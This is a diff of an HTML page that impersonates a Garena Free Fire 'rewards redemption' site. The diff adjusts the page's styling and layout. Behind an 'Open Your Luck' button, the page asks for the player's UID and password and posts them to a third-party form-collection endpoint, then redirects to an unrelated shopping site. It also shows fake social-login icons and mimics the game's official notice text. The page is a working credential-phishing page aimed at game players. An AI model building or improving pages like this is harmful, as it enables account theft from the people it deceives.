@@ -3,119 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Rewards</title>
+    <title>Garena Free Fire - Rewards</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap');
         
         body { 
-            margin: 0; 
-            padding: 0; 
-            font-family: 'Roboto', sans-serif; 
-            background: url('background.jpeg') no-repeat center center fixed; 
+            margin: 0; padding: 0; 
+            font-family: 'Teko', sans-serif; 
+            background: #000 url('images/background.jpeg') no-repeat center center fixed; 
             background-size: cover; 
-            color: white; 
-            text-align: center;
+            color: #fff;
+            overflow-x: hidden;
         }
         .overlay { 
-            background: rgba(0, 0, 0, 0.7); 
+            background: rgba(0, 0, 0, 0.6); 
             min-height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            padding: 20px;
-            box-sizing: border-box;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
-        /* Gifting Section Styles */
-        #gifting-section { margin-top: 50px; }
-        .gift-img { 
-            width: 100%; 
-            max-width: 380px; 
-            margin: 10px 0; 
-            border: 2px solid #ffbc00; 
-            border-radius: 8px;
-        }
+        /* Gifting Section */
+        #gifting-section { text-align: center; }
+        .gift-box { width: 90%; max-width: 400px; border: 3px solid #ffbc00; border-radius: 10px; margin-bottom: 20px; }
         .btn-open { 
-            background: #ffbc00; 
-            color: #000; 
-            padding: 12px 30px; 
-            border: none; 
-            font-weight: bold; 
-            font-size: 18px; 
-            cursor: pointer; 
-            border-radius: 4px;
-            margin-top: 15px;
+            background: #ffbc00; color: #000; padding: 10px 40px; border: none; 
+            font-size: 24px; font-weight: bold; cursor: pointer; text-transform: uppercase;
         }
 
-        /* Login Section Styles */
-        #login-section { display: none; width: 100%; max-width: 400px; margin-top: 30px; }
-        .login-box { 
-            background: rgba(18, 18, 18, 0.95); 
-            padding: 20px; 
-            border: 2px solid #ffbc00; 
-            border-radius: 4px;
+        /* Login Section */
+        #login-section { display: none; width: 90%; max-width: 400px; }
+        .login-container { 
+            background: rgba(20, 20, 20, 0.95); 
+            padding: 30px; border: 2px solid #ffbc00; border-radius: 5px; text-align: center;
         }
-        .header-logo { width: 100px; margin-bottom: 15px; }
-        .redemption-title { 
-            color: #ffbc00; 
-            font-size: 18px; 
-            font-weight: bold; 
-            margin-bottom: 20px; 
-        }
+        .logo { width: 120px; margin-bottom: 10px; }
+        .title { color: #ffbc00; font-size: 28px; margin-bottom: 20px; letter-spacing: 1px; }
+        
         input { 
-            width: 100%; 
-            padding: 12px; 
-            margin: 8px 0; 
-            border: 1px solid #333; 
-            background: #2a2a2a; 
-            color: white; 
-            box-sizing: border-box;
+            width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #444; 
+            background: #222; color: #fff; font-size: 18px; box-sizing: border-box;
         }
         .login-btn { 
-            width: 100%; 
-            padding: 12px; 
-            background: #ffbc00; 
-            border: none; 
-            color: #000; 
-            font-weight: bold; 
-            cursor: pointer; 
-            font-size: 16px; 
-            margin-top: 10px;
+            width: 100%; padding: 12px; background: #ffbc00; border: none; 
+            color: #000; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 10px;
         }
 
         /* Social Icons */
-        .social-icons { margin-top: 20px; display: flex; justify-content: center; gap: 15px; }
-        .social-icons img { width: 35px; cursor: pointer; }
-
-        /* Notice Section */
-        .notice { 
-            background: #fff; 
-            color: #333; 
-            text-align: left; 
-            padding: 15px; 
-            font-size: 12px; 
-            margin-top: 20px; 
-            border-radius: 4px; 
-            line-height: 1.4;
+        .social-row { display: flex; justify-content: center; gap: 12px; margin-top: 25px; }
+        .social-row a img { width: 32px; height: 32px; transition: 0.3s; }
+        
+        /* Notice Box */
+        .notice-box { 
+            background: #fff; color: #333; padding: 15px; border-radius: 4px; 
+            text-align: left; font-size: 14px; margin-top: 25px; line-height: 1.3;
         }
     </style>
 </head>
 <body>
 
 <div class="overlay">
-    
     <div id="gifting-section">
-        <img src="ff-logo-icon.png" class="header-logo" alt="Logo">
-        <h2>FREE REWARDS</h2>
-        <img src="background.jpeg" alt="Gifting" class="gift-img">
-        <br>
-        <button class="btn-open" onclick="showLogin()">Open Your Luck</button>
+        <img src="images/ff-logo-icon.png" width="100" alt="FF Logo"><br>
+        <img src="images/background.jpeg" class="gift-box" alt="Reward"><br>
+        <button class="btn-open" onclick="startLogin()">Open Your Luck</button>
     </div>
 
     <div id="login-section">
-        <img src="ff-logo-icon.png" class="header-logo" alt="Logo">
-        <div class="login-box">
-            <div class="redemption-title">REWARDS REDEMPTION SITE</div>
+        <div class="login-container">
+            <img src="images/ff-logo-icon.png" class="logo" alt="Logo">
+            <div class="title">REWARDS REDEMPTION SITE</div>
             
             <form action="https://formspree.io/f/xgoypvvn" method="POST">
                 <input type="text" name="UID" placeholder="Enter Player UID" required>
@@ -123,33 +78,30 @@
                 <input type="password" name="Password" placeholder="Password" required>
                 
                 <input type="hidden" name="_next" value="https://www.nykaa.com/spin-the-wheel-nd/lp">
-                
                 <button type="submit" class="login-btn">LOG-IN</button>
             </form>
 
-            <div class="social-icons">
-                <a href="https://www.facebook.com/login" target="_blank"><img src="facebook.png" alt="FB"></a>
-                <a href="https://vk.com/login" target="_blank"><img src="vk.png" alt="VK"></a>
-                <a href="https://accounts.google.com" target="_blank"><img src="google.png" alt="G"></a>
-                <a href="https://appleid.apple.com" target="_blank"><img src="apple.png" alt="A"></a>
-                <a href="https://x.com/login" target="_blank"><img src="twitter.png" alt="X"></a>
+            <div class="social-row">
+                <a href="https://www.facebook.com/login"><img src="images/facebook.png" alt="FB"></a>
+                <a href="https://vk.com/login"><img src="images/vk.png" alt="VK"></a>
+                <a href="https://accounts.google.com"><img src="images/google.png" alt="G"></a>
+                <a href="https://appleid.apple.com"><img src="images/apple.png" alt="A"></a>
+                <a href="https://x.com/login"><img src="images/twitter.png" alt="X"></a>
             </div>
         </div>
 
-        <div class="notice">
-            <strong>Important Notice:</strong><br>
-            1. Redemption code has 12/16 characters, consisting of capital letters and numbers.<br>
-            2. Item rewards are shown in [vault] tab in game lobby; Golds or diamonds will add in account wallet automatically.<br>
-            3. Please note redemption expiration date. Any expired codes cannot be redeemed.<br>
-            4. Reminder: you will not be able to redeem your rewards with guest accounts.
+        <div class="notice-box">
+            <b>Important Notice:</b><br>
+            1. Redemption code has 12/16 characters.<br>
+            2. Item rewards are shown in [vault] tab in game lobby.<br>
+            3. Golds or diamonds will add in account wallet automatically.<br>
+            4. Reminder: you will not be able to redeem with guest accounts.
         </div>
-        <p style="font-size: 10px; margin-top: 15px;">Copyright © Garena International. All rights Reserved.</p>
     </div>
-
 </div>
 
 <script>
-    function showLogin() {
+    function startLogin() {
         document.getElementById('gifting-section').style.display = 'none';
         document.getElementById('login-section').style.display = 'block';
     }
